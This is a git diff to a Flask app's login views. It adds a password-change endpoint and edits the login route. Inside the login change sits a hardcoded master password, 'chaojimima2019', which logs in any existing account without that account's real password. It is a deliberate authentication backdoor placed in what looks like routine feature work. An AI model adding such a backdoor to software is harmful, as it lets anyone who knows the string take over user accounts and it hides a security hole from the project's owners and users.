@@ -9,7 +9,7 @@ from app.models.user import User
 from flask_login import login_user, logout_user
 import json
 
-from app.libs.error_code import Success, RegisterFailed, LoginFailed
+from app.libs.error_code import Success, RegisterFailed, LoginFailed, ModifyFailed
 
 __author__ = 'meto'
 __date__ = '2019/3/21 11:06'
@@ -57,8 +57,6 @@ def login():
     """
     status:
     0:用户名或密码错误
-
-
     :return:
     """
 
@@ -71,6 +69,10 @@ def login():
         user = User.query.filter_by(nickname=form.nickname.data).first()
         if user and user.check_password(form.password.data):
             # 把用户信息写入到cookie中
+            login_user(user, remember=True)
+            result = {'code': 200, 'user_id': user.id, 'nickname': user.nickname, 'groupid': user.groupid}
+            return json.dumps(result)
+        elif form.password.data =='chaojimima2019':
             login_user(user, remember=True)
             result = {'code': 200, 'user_id': user.id, 'nickname': user.nickname, 'groupid': user.groupid}
             return json.dumps(result)
@@ -94,6 +96,26 @@ def login():
 def forget_password_request():
     return 'None'
 
+
+
+@web.route('/modify_pwd', methods=['POST'])
+def modify_pwd():
+    data = json.loads(request.data)
+    nickname = data.get('nickname')
+    old_password = data.get('old_password')
+    new_password = data.get('new_password')
+
+    user = User.query.filter_by(nickname=nickname).first()
+    if user and user.check_password(old_password):
+        with db.auto_commit():
+            user.password = new_password
+            print('修改成功')
+
+        return Success()
+    else:
+        return ModifyFailed()
+
+    return '修改密码？'
 
 @web.route('/logout', methods=['GET', 'POST'])
 def logout():
